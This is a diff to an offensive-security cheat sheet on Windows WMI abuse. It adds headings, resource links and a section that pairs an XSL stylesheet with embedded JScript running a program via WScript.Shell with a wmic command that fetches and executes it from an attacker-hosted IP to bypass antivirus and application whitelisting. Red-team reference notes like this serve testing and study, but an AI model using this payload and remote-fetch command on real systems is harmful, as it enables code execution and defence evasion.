@@ -13,6 +13,7 @@
     - [Remote WMI Protocols](#remote-wmi-protocols)
       - [DCOM](#dcom)
       - [WinRM / PowerShell Remoting](#winrm--powershell-remoting)
+      - [WMI and XSL](#wmi-and-xsl)
   - [WMI with PowerShell](#wmi-with-powershell)
   - [WMI host recon](#wmi-host-recon)
   - [WMI Active Directory Recon](#wmi-active-directory-recon)
@@ -25,14 +26,18 @@
   - [Exploitation](#exploitation)
       - [WMI Attacks – C2 Communication (WMI Class) – “Push” Attack](#wmi-attacks--c2-communication-wmi-class--push-attack)
       - [WMI Attacks – C2 Communication (Registry) – “Pull” Attack](#wmi-attacks--c2-communication-registry--pull-attack)
+  - [Malicious WMI providers](#malicious-wmi-providers)
   - [Persistence using WMI](#persistence-using-wmi)
       - [MOF files](#mof-files)
+      - [WMI Event Subscriptions](#wmi-event-subscriptions)
+      - [WMI Providers](#wmi-providers)
   - [Resources](#resources)
       - [BlackHat US 2015: Abusing WMI to built a persistent, asyncronous, and fileless backdoor.](#blackhat-us-2015-abusing-wmi-to-built-a-persistent-asyncronous-and-fileless-backdoor)
       - [WMI for Script Kiddies](#wmi-for-script-kiddies)
       - [Usefull WMIC queries for host and domain enumeration](#usefull-wmic-queries-for-host-and-domain-enumeration)
       - [Red Team handbook WMI command](#red-team-handbook-wmi-command)
       - [NoLimitSecu French Podcast dedicated to WMI](#nolimitsecu-french-podcast-dedicated-to-wmi)
+      - [Andrei Dumitrescu - OCD](#andrei-dumitrescu---ocd)
 
 - Lateral movement
 - Information gathering
@@ -40,7 +45,6 @@
 - Backdoors and persistence
 
 ## WMI 101
-
 *WMI = Windows Management Instrumentation*  
 - https://docs.microsoft.com/en-us/windows/win32/wmisdk/wmi-architecture
 
@@ -118,6 +122,32 @@ Get-WmiObject -Class Win32_Process -ComputerName 192.168.2.10 -Credential 'corp.
 #### WinRM / PowerShell Remoting
 - SOAP protocl based on the WSMan specification
 - 5985 (HTTP) or 5986 (HTTPS)
+
+#### WMI and XSL
+- https://www.ired.team/offensive-security/code-execution/application-whitelisting-bypass-with-wmic-and-xsl
+- https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1220/T1220.md
+
+This can be used to bypass AV solution or Application Whitelisting.
+
+XSL file to be hosted on attacker machine
+```
+<?xml version='1.0'?>
+<stylesheet
+xmlns="http://www.w3.org/1999/XSL/Transform" xmlns:ms="urn:schemas-microsoft-com:xslt"
+xmlns:user="placeholder"
+version="1.0">
+<output method="text"/>
+	<ms:script implements-prefix="user" language="JScript">
+	<![CDATA[
+	var r = new ActiveXObject("WScript.Shell").Run("calc");
+	]]> </ms:script>
+</stylesheet>
+```
+
+Retrieving and executing wmic command on **victim**
+```
+wmic os get /FORMAT:"http://192.168.0.10:8000/attacker.xsl"
+```
 
 ## WMI with PowerShell
 
@@ -642,9 +672,15 @@ $DeserializedOutput =
 romBase64String($EncodedOutput)))
 ```
 
+## Malicious WMI providers
+
 
 ## Persistence using WMI
 #### MOF files
+
+#### WMI Event Subscriptions
+
+#### WMI Providers
 
 
 ## Resources
@@ -663,3 +699,6 @@ romBase64String($EncodedOutput)))
 
 #### NoLimitSecu French Podcast dedicated to WMI
 - https://www.nolimitsecu.fr/wmi/
+
+#### Andrei Dumitrescu - OCD
+- https://raw.githubusercontent.com/Orange-Cyberdefense/cme-wmi/master/slides/WMI-Attacks_From_Theory2Practice.pdf
